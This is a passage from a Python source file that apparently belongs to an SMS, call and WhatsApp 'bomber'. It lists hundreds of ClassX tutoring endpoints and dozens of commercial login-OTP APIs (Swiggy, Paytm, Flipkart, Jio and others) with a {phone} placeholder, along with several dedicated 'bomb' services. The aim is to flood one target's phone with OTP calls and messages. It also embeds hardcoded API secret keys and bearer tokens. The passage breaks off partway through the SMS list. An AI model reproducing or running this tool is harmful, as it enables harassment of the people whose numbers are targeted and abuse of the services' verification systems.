    ("Uniquescienceacademy", "https://uniquescienceacademyapi.classx.co.in"),
    ("Unnatieducation", "https://unnatieducationapi.classx.co.in"),
    ("Unskillseducationlearnskill", "https://unskillseducationlearnskillapi.classx.co.in"),
    ("Upastapanainsititute", "https://upastapanainsitituteapi.classx.co.in"),
    ("Upclassesprayagraj", "https://upclassesprayagrajapi.classx.co.in"),
    ("Upgradeeducationofficial", "https://upgradeeducationapi.classx.co.in"),
    ("Upscalecode", "https://upscalecodeapi.classx.co.in"),
    ("Upsckaadda", "https://upsckaaddaapi.classx.co.in"),
    ("Upsckit", "https://upsckitapi.classx.co.in"),
    ("Upscmitra", "https://upscmitraapi.classx.co.in"),
    ("Upscsupersimplified", "https://upscsupersimplifiedapi.classx.co.in"),
    ("Upscvidyalaya", "https://upscvidyalayaapi.classx.co.in"),
    ("Urdubyirfan", "https://urdubyirfanapi.classx.co.in"),
    ("Utkarshclasses", "https://utkarshclassesapi.classx.co.in"),
    ("Uttamsacademy2", "https://uttamsacademy2api.classx.co.in"),
    ("Vaijanathdhendulesacademy", "https://vaijanathdhendulesacademyapi.classx.co.in"),
    ("Vaishnaviharkirat", "https://vyshnaviapi.classx.co.in"),
    ("Vajacademy", "https://vajacademyapi.classx.co.in"),
    ("Vakeelacademy", "https://vakeelacademyapi.classx.co.in"),
    ("Vamjaeducation", "https://vamjaeducationapi.classx.co.in"),
    ("Varunawasthi", "https://examenginevarunawasthiapi.classx.co.in"),
    ("Vasuconcept", "https://vasuconceptapi.classx.co.in"),
    ("Vaticaninstitute", "https://vaticaninstituteapi.classx.co.in"),
    ("Vcan24", "https://vcan24api.classx.co.in"),
    ("Vconlineclasses", "https://vconlineclassesapi.classx.co.in"),
    ("Vdemy", "https://vdemyapi.classx.co.in"),
    ("Vedakshiclasses", "https://vedakshiclassesapi.classx.co.in"),
    ("Vedamclassesstudyguardian", "https://vedamclassesapi.classx.co.in"),
    ("Vedanteducation", "https://vedanteducationapi.classx.co.in"),
    ("Vedantgurukul", "https://vedantgurukulapi.classx.co.in"),
    ("Vedantstudy", "https://vedantstudyapi.classx.co.in"),
    ("Veddigitaleducation", "https://veddigitaleducationapi.classx.co.in"),
    ("Vedicias", "https://vediciasapi.classx.co.in"),
    ("Vedpathshala", "https://vedpathshalaapi.classx.co.in"),
    ("Vedprep", "https://vedprepapi.classx.co.in"),
    ("Veertejango", "https://veertejangoapi.classx.co.in"),
    ("Venkatagirienglish", "https://venkatagirienglishapi.classx.co.in"),
    ("Venusshorthandclasses", "https://venusshorthandclassesapi.classx.co.in"),
    ("Verbalistlearning", "https://verbalistlearningapi.classx.co.in"),
    ("Veteran", "https://veteranapi.classx.co.in"),
    ("Vfirst", "https://vfirstapi.classx.co.in"),
    ("Vibrantelearning", "https://vibrantelearningapi.classx.co.in"),
    ("Vicsindore", "https://vicsindoreapi.classx.co.in"),
    ("Vidhanlawclasses", "https://vidhanlawclassesapi.classx.co.in"),
    ("Vidhigurukul", "https://vidhigurukulapi.classx.co.in"),
    ("Vidhyaagricultureacademy", "https://vidhyaagricultureacademykanpurapi.classx.co.in"),
    ("Vidhyakendra", "https://vidhyakendraapi.classx.co.in"),
    ("Vidwancompetition", "https://vidwancompetitionapi.classx.co.in"),
    ("Vidyabihar", "https://vidyabiharapi.teachx.in"),
    ("Vidyabihar_cx", "https://vidyabiharapi.classx.co.in"),
    ("Vidyadarpan", "https://vidyadarpanapi.classx.co.in"),
    ("Vidyaguruschoolprep", "https://vidyaguruschoolprepapi.classx.co.in"),
    ("Vidyanjalipoint", "https://vidyanjalipointapi.classx.co.in"),
    ("Vidyapeethrajasthan", "https://vidyapeethrajasthanapi.classx.co.in"),
    ("Vidyapower", "https://vidyapowerapi.classx.co.in"),
    ("Vidyasagaracademypune", "https://vidyasagaracademypuneapi.classx.co.in"),
    ("Vidyashreemanthan", "https://vidyashreemanthanapi.classx.co.in"),
    ("Vigyanvriksha", "https://vigyanvrikshaapi.classx.co.in"),
    ("Vijayacademy", "https://vijayacademyapi.classx.co.in"),
    ("Vijayacademyindore", "https://vijayacademyindoreapi.classx.co.in"),
    ("Vijayclasses", "https://vijayclassesapi.classx.co.in"),
    ("Vijaykantsirofficial", "https://vijaykantsirofficialapi.classx.co.in"),
    ("Vijaypathacademy", "https://vijaypathacademyapi.classx.co.in"),
    ("Vijaypathdefence", "https://vijaypathdefenceapi.classx.co.in"),
    ("Vijendrasirstudyhub", "https://vijendrasirstudyhubapi.classx.co.in"),
    ("Vikalpkotwal", "https://vikalpkotwalapi.classx.co.in"),
    ("Vikascoaching", "https://vikascoachingapi.classx.co.in"),
    ("Vikasshuklaenglish", "https://vikasshuklaenglishapi.classx.co.in"),
    ("Vineettutorials", "https://vineettutorialsapi.classx.co.in"),
    ("Vipgurugofficial", "https://vipgurugofficialapi.classx.co.in"),
    ("Virajnationalacademy", "https://virajnationalapi.classx.co.in"),
    ("Vishalkhodifad", "https://vishalkhodifadapi.classx.co.in"),
    ("Vishwamarathi", "https://vishwamarathiapi.classx.co.in"),
    ("Vishwasacademy", "https://vishwasacademyapi.classx.co.in"),
    ("Visionacademyofficial", "https://visionacademyofficialapi.classx.co.in"),
    ("Visioncoachingclassesakole", "https://visioncoachingclassesakoleapi.classx.co.in"),
    ("Visionkhaki", "https://visionkhakiapi.classx.co.in"),
    ("Visionscience", "https://visionscienceapi.classx.co.in"),
    ("Visionupdate", "https://visionupdateapi.classx.co.in"),
    ("Visionupsc", "https://visionupscapi.classx.co.in"),
    ("Vitaneducation", "https://vitaneducationapi.classx.co.in"),
    ("Vitthalkangane", "https://vitthalkanganeapi.classx.co.in"),
    ("Vivanta", "https://vivantaapi.classx.co.in"),
    ("Vivekanandlearningappvla", "https://vivekanandlearningappapi.classx.co.in"),
    ("Vivekanandpublicintercollege", "https://vivekanandpublicintercollegeapi.classx.co.in"),
    ("Vivekpawaracademy", "https://vivekacademyapi.classx.co.in"),
    ("Vj_appx", "https://vjeducationapi.appx.co.in"),
    ("Vjeducvation", "https://vjeducationapi.classx.co.in"),
    ("Vlrtraining", "https://vlrtrainingapi.classx.co.in"),
    ("Vmrlogics", "https://vmrlogicsapi.classx.co.in"),
    ("Vnrclasses", "https://vnrclassesapi.classx.co.in"),
    ("Voraclasses", "https://voraclassesapi.classx.co.in"),
    ("Vseducationofficial", "https://vseducationapi.classx.co.in"),
    ("Vsmpscacademy", "https://vsmpscacademyapi.classx.co.in"),
    ("Vvsias", "https://vvsiasapi.classx.co.in"),
    ("Warriorofficer", "https://warriorofficerapi.classx.co.in"),
    ("Wealthsagalearn", "https://wealthsagalearnapi.classx.co.in"),
    ("Webcityitgk", "https://webcityitgkapi.classx.co.in"),
    ("Webdemybysaunaksir", "https://webdemysaunaksirapi.classx.co.in"),
    ("Webinar", "https://webinarapi.classx.co.in"),
    ("Websankulcivilengineering", "https://websankulcivilengineeringapi.classx.co.in"),
    ("Websankullive", "https://websankulliveapi.classx.co.in"),
    ("Wewonacademy", "https://wewonacademyapi.classx.co.in"),
    ("Whatzbehind", "https://whatzbehindapi.classx.co.in"),
    ("Whiteboardacademy", "https://whiteboardacademyapi.classx.co.in"),
    ("Wingsekudaan", "https://wingsekudaanapi.classx.co.in"),
    ("Winias", "https://winiasapi.classx.co.in"),
    ("Winnerhubclasses", "https://winnerhubclassesapi.classx.co.in"),
    ("Winners", "https://winnersinstituteapi.classx.co.in"),
    ("Winnersclasses", "https://winnersclassesapi.classx.co.in"),
    ("Winnerspublications", "https://winnerspublicationsapi.classx.co.in"),
    ("Winnerstest", "https://winnerstestapi.classx.co.in"),
    ("Winnersworld", "https://winnersworldapi.classx.co.in"),
    ("Winningways", "https://winningwaysapi.classx.co.in"),
    ("Winrrb", "https://winrrbapi.classx.co.in"),
    ("Xambites", "https://xambitesapi.classx.co.in"),
    ("Xploreacademy", "https://xploracademyapi.classx.co.in"),
    ("Yashadaacademypune", "https://yashadaacademypuneapi.classx.co.in"),
    ("Yashashriiacademy", "https://yashashriiacademyapi.classx.co.in"),
    ("Yashmaheshwari", "https://yashmaheshwariapi.classx.co.in"),
    ("Yashpatelknowledge", "https://yashpatelknowledgeapi.classx.co.in"),
    ("Yashwantacademypune", "https://yashwantacademypuneapi.classx.co.in"),
    ("Ybdacademy", "https://ybdacademyapi.classx.co.in"),
    ("Yctfastbook", "https://yctfastbookapi.classx.co.in"),
    ("Yesandyesexamsadda", "https://yesexamsaddaapi.classx.co.in"),
    ("Yescompetitiveexamslibrary", "https://yescompetitiveexamslibraryapi.classx.co.in"),
    ("Yesofficer", "https://yesofficerapi.classx.co.in"),
    ("Yespoliceacademy", "https://yespoliceacademyapi.classx.co.in"),
    ("Yodha", "https://yodhaapi.classx.co.in"),
    ("Yodhaapp", "https://yodhaappapi.classx.co.in"),
    ("Yogenderkadyansacademy", "https://yogenderkadyanapi.classx.co.in"),
    ("Yourstudy", "https://yourstudyapi.classx.co.in"),
    ("Yoursuccessmate", "https://yoursuccessmateapi.classx.co.in"),
    ("Yspliveclass", "https://yspliveclassapi.classx.co.in"),
    ("Yugandharacademy", "https://yugandharacademyapi.classx.co.in"),
    ("Yugantaracademyupsc", "https://yugantaracademyapi.classx.co.in"),
    ("Yuktipublication", "https://yuktipublicationapi.classx.co.in"),
    ("Yuvaiasacademyofficial", "https://yuvaiasacademyofficialapi.classx.co.in"),
    ("Yuvaupnishadfoundation", "https://yuvaupnishadfoundationonlineapi.classx.co.in"),
    ("Zidacademyhisar", "https://zidacademyhisarapi.classx.co.in"),
    ("Zinmatt", "https://zinmattapi.classx.co.in"),
    ("Zitaenglishacademy", "https://zitaenglishacademyapi.classx.co.in"),
    ("Zscore", "https://zscoreapi.classx.co.in"),
]

def build_classx_api_configs():
    """Build ApiConfig for all ClassX endpoints using their standard OTP endpoint."""
    configs = []
    seen = set()
    for name, base in CLASSX_APIS:
        if name in seen:
            continue
        seen.add(name)
        url = f"{base}/api/v3/sendotp"
        configs.append(ApiConfig(
            name=f"ClassX_{name}",
            url=url,
            method="POST",
            headers={
                "Content-Type": "application/json",
                "User-Agent": "okhttp/4.9.3",
                "Accept": "application/json",
            },
            body='{"phone":"{phone}","type":"login","country_code":"91"}',
            category="sms"
        ))
    return configs

# ============================================================
# ALL APIS
# ============================================================
def get_all_apis():
    apis = []

    call_apis = [
        ApiConfig("TataCapital_Call", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}', "call"),
        ApiConfig("1MG_Call", "https://www.1mg.com/auth_api/v6/create_token", "POST",
                  {"Content-Type": "application/json"}, '{"number":"{phone}","otp_on_call":true}', "call"),
        ApiConfig("Swiggy_Call", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Myntra_Call", "https://www.myntra.com/gw/mobile-auth/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Flipkart_Call", "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}', "call"),
        ApiConfig("Paytm_Call", "https://accounts.paytm.com/signin/otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","loginData":"LOGIN_USING_PHONE"}', "call"),
        ApiConfig("Zomato_Call", "https://www.zomato.com/php/asyncLogin.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}", "call"),
        ApiConfig("MakeMyTrip_Call", "https://www.makemytrip.com/api/umbrella/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Uber_Call", "https://auth.uber.com/v2/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("BigBasket_Call", "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_number":"{phone}"}', "call"),
        ApiConfig("PhonePe_Call", "https://www.phonepe.com/api/v2/otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("OYO_Call", "https://api.oyoroomscrm.com/api/v2/user/send_otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Rapido_Call", "https://rapido.bike/api/v2/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("BookMyShow_Call", "https://in.bmscdn.com/mjson/User/SendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNo":"{phone}"}', "call"),
        ApiConfig("Meesho_Call", "https://api.meesho.com/v2/auth/send_otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Snapdeal_Call", "https://www.snapdeal.com/authenticate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Croma_Call", "https://api.croma.com/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Call_Bomber", "https://call-bomber-50k3t8a6r.vercel.app/bomb?number={phone}", "GET", {}, None, "call"),
        ApiConfig("Jio_Call", "https://www.jio.com/api/jio-login-service/login/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","loginFlowType":"MOBILE","alternateNumber":""}', "call"),
        ApiConfig("MagicPin_Call", "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/", "POST",
                  {"Content-Type": "application/json", "auth-secret-key": "kQLMCQBrfevxhzuPpFWT",
                   "origin": "https://magicpin.in", "x-requested-with": "mark.via.gp"},
                  '{"phoneNumber":"91{phone}","authMethod":"call","token":""}', "call"),
        ApiConfig("Astroyogi_Call", "https://comm.astroyogi.com/api/OtpComm/SendOtp", "POST",
                  {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg4NDU0MTc4LCJleHAiOjE3OTYyMzAxNzh9."},
                  '{"phoneCode":"91","countryCode":"IN","mobileNumber":"{phone}","platform":"Web","IpAddress":"117.225.1.174","requestType":"call","countryCodeByHeader":"IN"}', "call"),
        ApiConfig("Refyne_Call", "https://prod-api.refyne.co.in/auth/v3/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"channel":"IVR","recipient":"{phone}"}', "call"),
        ApiConfig("SonyLiv_Call", "https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2", "POST",
                  {"Content-Type": "application/json", "app_version": "3.8.3"},
                  '{"mobileNumber":"{phone}","smsType":"Voice","channelPartnerID":"MSMIND","country":"IN","timestamp":"{timestamp}","otpSize":4,"isMobileMandatory":true,"loginType":"REGISTERORSIGNIN"}', "call"),
        ApiConfig("Snitch_Call", "https://www.snitch.com/api/auth/resend-otp?mode=voice", "POST",
                  {"Content-Type": "application/json", "X-CAP-Token": "015a4adb4fcebceb:dcd8d06bbd9311f025af80eaeeb8e0"},
                  '{"mobile_number":"+91{phone}"}', "call"),
        ApiConfig("Hotstar_Call", "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=resendOtp", "POST",
                  {"Content-Type": "application/json", "x-hs-platform": "mweb", "x-country-code": "in"},
                  '{"body":{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","phone_number":"{phone}","initiate_by":1,"recaptcha_token":"","source":0}}', "call"),
        ApiConfig("Airtel_Call", "https://myairtelapp.bsbportal.com/app/guardian/api/bouncer/v1/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"key":"data={phone}&timestamp={timestamp}"}', "call"),
        ApiConfig("Jeevansathi_Call", "https://www.jeevansathi.com/app-gateway/auth/v1/phone/otp", "POST",
                  {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"}, '{"userId":"{phone}","isd":"91","otpType":"LOGIN_PROFILE"}', "call"),
        ApiConfig("Mobikwik_Call", "https://webapi.mobikwik.com/p/otp/v1/generate", "POST",
                  {"Content-Type": "application/json"}, '{"data":"{random_md5}"}', "call"),
        ApiConfig("Quikr_Call", "https://www.quikr.com/core/sendOtp", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile={phone}", "call"),
        ApiConfig("Practo_Call", "https://accounts.practo.com/send_voice_otp", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile=%2B91{phone}", "call"),
        ApiConfig("SmartCoin_Call", "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request", "POST",
                  {"Content-Type": "application/json", "user_platform": "WEBFLOW", "platform_code": "olyv"},
                  '{"phone_number":"{phone}","app_version":"100101","channel":"IVR","request_type":"REGISTRATION","onboarding_consent":true}', "call"),
        ApiConfig("OLX_Call", "https://www.olx.in/api/auth/authenticate", "POST",
                  {"Content-Type": "application/json", "user-agent": "okhttp/3.9.1"},
                  '{"method":"call","phone":"{phone}","language":"en-IN","grantType":"retry"}', "call"),
        ApiConfig("Niloy_Call_API", "https://rk-niloy-call-api.vercel.app/api?phone={phone}", "GET", {}, None, "call"),
        ApiConfig("NoBroker_Call", "https://www.nobroker.in/api/v3/account/otp/send", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}&countryCode=IN", "call"),
        ApiConfig("RedBus_Call", "https://www.redbus.in/api/getOtpV2", "POST",
                  {"Content-Type": "application/json"}, '{"phoneCode":"91","mobile":"{phone}","whatsappOption":false,"reCaptchaResponse":"{random_md5}"}', "call"),
        ApiConfig("PharmEasy_Call", "https://pharmeasy.in/api/auth/requestOTP", "POST",
                  {"Content-Type": "application/json"}, '{"contactNumber":"{phone}"}', "call"),
        ApiConfig("Lenskart_Call", "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "POST",
                  {"Content-Type": "application/json", "x-api-client": "mobilesite", "x-session-token": "{uuid}"},
                  '{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}', "call"),
        ApiConfig("GoKwik_Call", "https://gkx.gokwik.co/v4/auth/otp/login/trigger", "POST",
                  {"Content-Type": "application/json", "authorization": "{uuid}"},
                  '{"phone":"{phone}","country":"IN"}', "call"),
        ApiConfig("Zepto_Call", "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", "POST",
                  {"Content-Type": "application/json", "session_id": "{uuid}", "device_id": "{uuid}"},
                  '{"mobileNumber":"{phone}","countryCode":"+91"}', "call"),
        ApiConfig("VRLBus_Call", "https://www.vrlbus.in/Web_Methods/OtherWebMethod.aspx/GenrateOTP", "POST",
                  {"Content-Type": "application/json;charset=UTF-8"}, '{"PhoneNo":"{phone}","Captcha":"{random_id}"}', "call"),
        ApiConfig("KreditBee_Call", "https://api.kreditbee.in/v1/me/otp", "PUT",
                  {"Content-Type": "application/json", "authorization": "Bearer null"},
                  '{"reason":"loginOrRegister","mobile":"{phone}","appsflyerId":"{uuid}","mediaSource":"","firebaseInstanceId":"","firebaseiosAppInstId":""}', "call"),
        ApiConfig("Udaan_Call", "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "x-app-id": "udaan-auth"},
                  "mobile={phone}", "call"),
        ApiConfig("Call_API", "https://call-api-sable.vercel.app/bomb/{phone}", "GET", {}, None, "call"),
        ApiConfig("Thakur_Call", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET", {}, None, "call"),
        ApiConfig("Eyecon_Call", "https://api.eyecon-app.com/app/cli_auth/gettransport", "GET",
                  {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, None, "call"),
        ApiConfig("Proptiger_Call", "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call", "POST",
                  {"Content-Type": "application/json"}, '{"contactNumber":"{phone}","domainId":"2"}', "call"),
        ApiConfig("Ola_Voice", "https://api.olacabs.com/v1/voice-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Uber_Voice_V2", "https://auth.uber.com/v2/voice-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"+91{phone}"}', "call"),
        ApiConfig("Myntra_Voice_V2", "https://www.myntra.com/gw/mobile-auth/voice-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("PhonePe_Voice", "https://www.phonepe.com/api/v1/voice-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("BigBasket_Voice", "https://www.bigbasket.com/api/v1/voice-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("BookMyShow_Voice", "https://in.bookmyshow.com/api/v1/voice-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("RedBus_Voice", "https://www.redbus.in/api/v1/voice-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Kotak_Voice", "https://www.kotak.com/api/otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Amazon_Voice", "https://www.amazon.in/ap/signin", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}&action=voice_otp", "call"),
    ]
    apis.extend(call_apis)

    whatsapp_apis = [
        ApiConfig("KPN_WhatsApp", "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":{"number":"{phone}","country_code":"+91"}}', "whatsapp"),
        ApiConfig("KPN_WhatsApp_AND", "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "POST",
                  {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"},
                  '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}', "whatsapp"),
        ApiConfig("EkaCare_WhatsApp", "https://auth.eka.care/auth/init", "POST",
                  {"Content-Type": "application/json"}, '{"payload":{"allowWhatsapp":true,"mobile":"+91{phone}"},"type":"mobile"}', "whatsapp"),
        ApiConfig("MamaEarth_WA", "https://auth.mamaearth.in/v1/auth/initiate-signup", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "whatsapp"),
        ApiConfig("Havells_WA", "https://havells.com/otplogin/account/otploginpost/", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on", "whatsapp"),
        ApiConfig("HeroFinCorp_WA", "https://loans.apps.herofincorp.com/api/generateOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","terms":true,"whatsapp":true}', "whatsapp"),
        ApiConfig("Astroyogi_WA", "https://comm.astroyogi.com/api/OtpComm/SendOtp", "POST",
                  {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg4NDU0MTc4LCJleHAiOjE3OTYyMzAxNzh9."},
                  '{"phoneCode":"91","countryCode":"IN","mobileNumber":"{phone}","platform":"Web","IpAddress":"117.225.1.174","requestType":"whatsapp","countryCodeByHeader":"IN"}', "whatsapp"),
        ApiConfig("Refyne_WA", "https://prod-api.refyne.co.in/auth/v3/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"channel":"WHATSAPP","recipient":"{phone}"}', "whatsapp"),
        ApiConfig("MakeMyTrip_WA", "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&language=eng&currency=inr", "POST",
                  {"Content-Type": "application/json", "vid": "{uuid}", "tid": "{uuid}", "deviceid": "{uuid}"},
                  '{"loginId":"{phone}","type":6,"isEncoded":false,"channel":["MOBILE","WHATSAPP"],"countryCode":"91"}', "whatsapp"),
        ApiConfig("Housing_WA", "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API", "POST",
                  {"Content-Type": "application/json", "app-name": "mobile_web_buyer"},
                  '{"query":"mutation($phone:String,$otpLength:Int,$channel:String){sendOtp(phone:$phone,otpLength:$otpLength,channel:$channel){success message}}","variables":{"phone":"{phone}","otpLength":4,"channel":"whatsapp"}}', "whatsapp"),
        ApiConfig("HERE_WA", "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","countryCodeId":"b43569eb-6798-43fb-8d27-47d55d7c544b","source":"whatsapp"}', "whatsapp"),
        ApiConfig("VisitApp_WA", "https://api.getvisitapp.com/v3/new-auth/login-phone", "POST",
                  {"Content-Type": "application/json"}, '{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{phone}","platform":"WEB"}', "whatsapp"),
        ApiConfig("MuscleBlaze_WA", "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9", "GET",
                  {"HKAUTH": "396144437|9l7fQT5m5HJtTrXqRZiWdQ==", "pageuri": "/", "st": "9", "plt": "2"}, None, "whatsapp"),
        ApiConfig("RedBus_WA", "https://www.redbus.in/hotels/api/sendOtpV2", "POST",
                  {"Content-Type": "application/json"}, '{"phoneCode":"91","mobile":"{phone}","whatsappOptin":true,"reCaptchaResponse":"{random_md5}"}', "whatsapp"),
        ApiConfig("MagicPin_WA", "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/", "POST",
                  {"Content-Type": "application/json", "auth-secret-key": "kQLMCQBrfevxhzuPpFWT", "origin": "https://magicpin.in", "x-requested-with": "mark.via.gp"},
                  '{"phoneNumber":"91{phone}","authMethod":"whatsapp","token":"{random_md5}"}', "whatsapp"),
        ApiConfig("Foxy_WA", "https://www.foxy.in/api/v2/users/send_otp", "POST",
                  {"Content-Type": "application/json"}, '{"user":{"phone_number":"+91{phone}"},"via":"whatsapp"}', "whatsapp"),
        ApiConfig("Stratzy_WA", "https://stratzy.in/api/web/whatsapp/sendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"phoneNo":"{phone}"}', "whatsapp"),
        ApiConfig("Jockey_WA", "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", "GET", {}, None, "whatsapp"),
        ApiConfig("Rappi_WA", "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "POST",
                  {"Content-Type": "application/json; charset=utf-8"}, '{"country_code":"+91","phone":"{phone}"}', "whatsapp"),
        ApiConfig("Rappi_WA_V2", "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create", "POST",
                  {"Content-Type": "application/json; charset=UTF-8"},
                  '{"phone":"{phone}","country_code":"+91"}', "whatsapp"),
        ApiConfig("Meesho_WA", "https://meesho.com/gw/login-register/v1/sendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"number":"{phone}","otpOnCall":true}', "whatsapp"),
    ]
    apis.extend(whatsapp_apis)

    sms_apis = [
        ApiConfig("Lenskart", "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phoneCode":"+91","telephone":"{phone}"}'),
        ApiConfig("NoBroker", "https://www.nobroker.in/api/v3/account/otp/send", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}&countryCode=IN"),
        ApiConfig("PharmEasy", "https://pharmeasy.in/api/v2/auth/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Wakefit", "https://api.wakefit.co/api/consumer-sms-otp/", "POST",
                  {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb"},
                  '{"mobile":"{phone}","whatsapp_opt_in":1}'),
        ApiConfig("Meru", "https://merucabapp.com/api/otp/generate", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile_number={phone}"),
        ApiConfig("Doubtnut", "https://api.doubtnut.com/v4/student/login", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}","language":"en"}'),
        ApiConfig("ShipRocket", "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}'),
        ApiConfig("Servetel", "https://api.servetel.in/v1/auth/otp", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile_number={phone}"),
        ApiConfig("Snitch", "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_number":"+91{phone}"}'),
        ApiConfig("Housing", "https://login.housing.com/api/v2/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country_url_name":"in"}'),
        ApiConfig("RentoMojo", "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Khatabook", "https://api.khatabook.com/v1/auth/request-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","app_signature":"wk+avHrHZf2"}'),
